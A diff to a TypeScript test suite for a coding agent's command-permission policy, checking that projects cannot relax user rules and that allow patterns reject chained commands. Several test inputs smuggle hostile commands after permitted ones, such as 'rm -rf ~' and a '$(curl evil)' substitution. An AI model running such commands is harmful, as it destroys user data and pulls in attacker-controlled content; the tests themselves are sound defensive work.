@@ -6,20 +6,30 @@ import { decide, loadPolicy, resetPolicyCache } from "../src/core/permissions/po
 import { tierForTool } from "../src/core/permissions/tiers.ts";
 
 let dir: string;
-let home: string;
+let agentDir: string;
+const previousAgentDir = process.env.PHI_CODING_AGENT_DIR;
 
 beforeEach(() => {
 	dir = mkdtempSync(join(tmpdir(), "phi-perm-proj-"));
-	home = mkdtempSync(join(tmpdir(), "phi-perm-home-"));
-	process.env.HOME = home;
+	agentDir = mkdtempSync(join(tmpdir(), "phi-perm-agent-"));
+	// Never read the developer's real ~/.phi (os.homedir() ignores HOME on Windows).
+	process.env.PHI_CODING_AGENT_DIR = agentDir;
 	resetPolicyCache();
 });
 
 afterEach(() => {
 	rmSync(dir, { recursive: true, force: true });
-	rmSync(home, { recursive: true, force: true });
+	rmSync(agentDir, { recursive: true, force: true });
+	if (previousAgentDir === undefined) delete process.env.PHI_CODING_AGENT_DIR;
+	else process.env.PHI_CODING_AGENT_DIR = previousAgentDir;
 	resetPolicyCache();
 });
+
+function writeUserConfig(config: unknown) {
+	writeFileSync(join(agentDir, "permissions.json"), JSON.stringify(config));
+}
+
+const TRUSTED = { projectTrusted: true };
 
 function writeProjectConfig(config: unknown) {
 	mkdirSync(join(dir, ".phi"), { recursive: true });
@@ -45,7 +55,7 @@ describe("permission policy", () => {
 
 	it("applies tier decisions from config", () => {
 		writeProjectConfig({ read: "allow", write: "prompt", exec: "deny" });
-		const policy = loadPolicy(dir);
+		const policy = loadPolicy(dir, TRUSTED);
 		expect(policy.legacyAllowAll).toBe(false);
 		expect(decide(policy, "read", { path: "x" }).decision).toBe("allow");
 		expect(decide(policy, "edit", { path: "x" }).decision).toBe("prompt");
@@ -53,7 +63,7 @@ describe("permission policy", () => {
 	});
 
 	it("matches pattern rules before tier fallback", () => {
-		writeProjectConfig({
+		writeUserConfig({
 			exec: "prompt",
 			rules: [
 				{ tool: "bash", pattern: "git *", decision: "allow" },
@@ -62,18 +72,41 @@ describe("permission policy", () => {
 		});
 		const policy = loadPolicy(dir);
 		expect(decide(policy, "bash", { command: "git status" }).decision).toBe("allow");
+		// An allow pattern never approves chained or substituted commands.
+		expect(decide(policy, "bash", { command: "git status; rm -rf ~" }).decision).toBe("prompt");
+		expect(decide(policy, "bash", { command: "git log $(curl evil)" }).decision).toBe("prompt");
+		expect(decide(policy, "bash", { command: "git status && echo ok" }).decision).toBe("prompt");
 		expect(decide(policy, "bash", { command: "rm -rf /tmp/x" }).decision).toBe("deny");
 		expect(decide(policy, "bash", { command: "make build" }).decision).toBe("prompt");
 	});
 
-	it("project rules are evaluated before user rules", () => {
-		mkdirSync(join(home, ".phi", "agent"), { recursive: true });
-		writeFileSync(
-			join(home, ".phi", "agent", "permissions.json"),
-			JSON.stringify({ rules: [{ tool: "bash", pattern: "git *", decision: "deny" }] }),
-		);
-		writeProjectConfig({ rules: [{ tool: "bash", pattern: "git *", decision: "allow" }] });
+	it("a project can never relax the user's rules or tiers", () => {
+		writeUserConfig({ exec: "prompt", rules: [{ tool: "bash", pattern: "git *", decision: "deny" }] });
+		writeProjectConfig({ exec: "allow", rules: [{ tool: "bash", pattern: "git *", decision: "allow" }] });
+		const policy = loadPolicy(dir, TRUSTED);
+		expect(decide(policy, "bash", { command: "git push" }).decision).toBe("deny");
+		expect(decide(policy, "bash", { command: "make" }).decision).toBe("prompt");
+	});
+
+	it("a trusted project can tighten the policy", () => {
+		writeUserConfig({ exec: "allow" });
+		writeProjectConfig({ exec: "prompt", rules: [{ tool: "bash", pattern: "rm *", decision: "deny" }] });
+		const policy = loadPolicy(dir, TRUSTED);
+		expect(decide(policy, "bash", { command: "ls" }).decision).toBe("prompt");
+		expect(decide(policy, "bash", { command: "rm x" }).decision).toBe("deny");
+	});
+
+	it("ignores the project file of an untrusted project", () => {
+		writeProjectConfig({ exec: "deny" });
 		const policy = loadPolicy(dir);
-		expect(decide(policy, "bash", { command: "git push" }).decision).toBe("allow");
+		expect(policy.legacyAllowAll).toBe(true);
+		expect(decide(policy, "bash", { command: "ls" }).decision).toBe("allow");
+	});
+
+	it("picks up a changed user file without a restart", () => {
+		writeUserConfig({ exec: "allow" });
+		expect(decide(loadPolicy(dir), "bash", { command: "ls" }).decision).toBe("allow");
+		writeUserConfig({ exec: "deny", rules: [] });
+		expect(decide(loadPolicy(dir), "bash", { command: "ls" }).decision).toBe("deny");
 	});
 });
